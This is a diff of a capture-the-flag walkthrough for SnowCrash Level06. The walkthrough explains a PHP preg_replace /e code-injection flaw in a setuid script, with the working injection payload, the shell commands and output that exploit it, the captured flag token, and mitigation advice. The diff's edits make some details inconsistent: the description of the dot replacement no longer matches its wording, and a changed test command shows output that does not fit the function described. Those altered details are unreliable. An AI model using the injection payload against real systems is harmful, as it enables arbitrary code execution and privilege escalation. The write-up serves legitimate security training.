@@ -1,6 +1,7 @@
 # SnowCrash Level06 Walkthrough
 
 ## Overview
+
 Level06 demonstrates a **PHP code injection vulnerability** through the dangerous `/e` modifier in `preg_replace()`. This level shows how legacy PHP features can lead to arbitrary code execution when processing user-controlled input.
 
 ## Initial Investigation
@@ -9,16 +10,18 @@ Upon logging into the level06 user, we find a PHP script:
 
 ```bash
 level06@SnowCrash:~$ ls -la
-total 15
-dr-xr-x---+ 1 level06 level06   120 Mar  5  2016 .
-d--x--x--x  1 root    users     340 Aug 30  2015 ..
--r-x------  1 level06 level06   220 Apr  3  2012 .bash_logout
--r-x------  1 level06 level06  3518 Aug 30  2015 .bashrc
--rwsr-x---+ 1 flag06  level06   356 Mar  5  2016 level06.php
--r-x------  1 level06 level06   675 Apr  3  2012 .profile
+total 24
+dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
+-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+-r-x------  1 level06 level06  675 Apr  3  2012 .profile
 ```
 
 ### Key Observations
+
 - The `level06.php` script has **setuid** bit set (`-rwsr-x---`)
 - It's owned by `flag06` user, meaning it runs with flag06 privileges
 - The script is executable and readable by level06
@@ -55,13 +58,17 @@ print $r;
 ### Code Breakdown
 
 #### Function `y($m)`
+
 This function performs character replacements:
-- Replaces `.` (dots) with ` x ` (space-x-space)
+
+- Replaces `.` (dots) with `x` (space-x-space)
 - Replaces `@` (at symbols) with ` y` (space-y)
 - Returns the transformed string
 
 #### Function `x($y, $z)`
+
 This is the main processing function:
+
 1. **`$a = file_get_contents($y);`** - Reads the entire file into a string
 2. **`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`** - **VULNERABLE LINE**
 3. **`$a = preg_replace("/\[/", "(", $a);`** - Converts `[` to `(`
@@ -69,22 +76,26 @@ This is the main processing function:
 5. **`return $a;`** - Returns processed content
 
 #### Main Execution
+
 - **`$r = x($argv[1], $argv[2]);`** - Processes file specified as first argument
 - **`print $r;`** - Outputs the result
 
 ### The Critical Vulnerability
 
 The dangerous line is:
+
 ```php
 $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
 ```
 
 #### Understanding the `/e` Modifier
+
 - The `/e` modifier (deprecated since PHP 5.5, removed in PHP 7.0) evaluates the replacement string as **PHP code**
 - This means the replacement `y("\\2")` is executed as actual PHP code
 - `\\2` refers to the second captured group `(.*)` from the regex
 
 #### Pattern Matching
+
 - **Pattern**: `/(\[x (.*)\])/e`
 - **Matches**: Text like `[x something]`
 - **Captures**: The `something` part as group 2
@@ -93,12 +104,15 @@ $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
 ## Understanding the Template System
 
 This script acts as a template processor:
+
 1. Looks for patterns like `[x content]` in files
 2. Processes the `content` through the `y()` function
 3. Converts remaining brackets to parentheses
 
 ### Example Normal Usage
+
 If a file contains `[x hello.world@domain]`:
+
 1. The pattern `[x hello.world@domain]` matches
 2. `hello.world@domain` is captured
 3. `y("hello.world@domain")` is executed
@@ -124,14 +138,15 @@ The script successfully reads and outputs the file content.
 ### Step 2: Test Template Processing
 
 ```bash
-level06@SnowCrash:~$ echo "[x test.example@domain]" > /tmp/template
+level06@SnowCrash:~$ echo "[[x test.example@domain]]" > /tmp/template
 level06@SnowCrash:~$ ./level06 /tmp/template
-(test x example y domain)
+(test x example ydomain)
 ```
 
 This shows the template processing working:
+
 - `[x test.example@domain]` was processed
-- `test.example@domain` became `test x example y domain` through `y()`
+- `test.example@domain` became `test x example ydomain` through `y()`
 - `[` and `]` were converted to `(` and `)`
 
 ### Step 3: Code Injection Test
@@ -149,6 +164,7 @@ level06.php
 #### Understanding the Injection
 
 The payload `[x ${`ls`}]` works as follows:
+
 1. **Pattern Match**: `[x ${`ls`}]` matches the regex
 2. **Captured Content**: `${`ls`}` is captured as group 2
 3. **Code Evaluation**: Instead of `y("${`ls`}")`, PHP evaluates `${`ls`}`
@@ -169,7 +185,6 @@ PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboi
 ```
 
 **Success!** The flag is embedded in the error message: `wiok45aaoguiboiki2tuin6ub`
-
 
 ## Technical Deep Dive
 
@@ -202,21 +217,25 @@ Error with Flag: "Undefined variable: Check flag.Here is your token : ..."
 This level demonstrates several critical vulnerabilities:
 
 ### 1. **Code Injection via preg_replace /e**
+
 - Direct execution of user-controlled input as PHP code
 - Deprecated feature with known security risks
 - Insufficient input validation
 
 ### 2. **File Processing Vulnerabilities**
+
 - Processing user-controlled files without sanitization
 - Template systems with dangerous evaluation features
 
 ### 3. **Privilege Escalation**
+
 - Setuid binary amplifies the impact of code injection
 - Web-like vulnerabilities in system binaries
 
 ## Mitigation Strategies
 
 ### 1. **Avoid /e Modifier**
+
 ```php
 // Instead of (vulnerable):
 $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
@@ -228,6 +247,7 @@ $a = preg_replace_callback("/(\[x (.*)\])/", function($matches) {
 ```
 
 ### 2. **Input Validation**
+
 ```php
 function y($m) {
     // Validate input before processing
@@ -241,6 +261,7 @@ function y($m) {
 ```
 
 ### 3. **Sandboxing**
+
 - Run template processing in restricted environments
 - Limit available PHP functions
 - Use safe evaluation libraries
@@ -248,8 +269,9 @@ function y($m) {
 ## Real-World Context
 
 This vulnerability pattern is found in:
+
 - **Legacy PHP applications** using old preg_replace patterns
-- **Template engines** with unsafe evaluation features  
+- **Template engines** with unsafe evaluation features
 - **Content management systems** processing user templates
 - **Configuration processors** with dynamic evaluation
 
@@ -261,6 +283,7 @@ This vulnerability pattern is found in:
 - **Modern PHP**: Use `preg_replace_callback()` instead
 
 ## Flag
+
 ```
 wiok45aaoguiboiki2tuin6ub
 ```
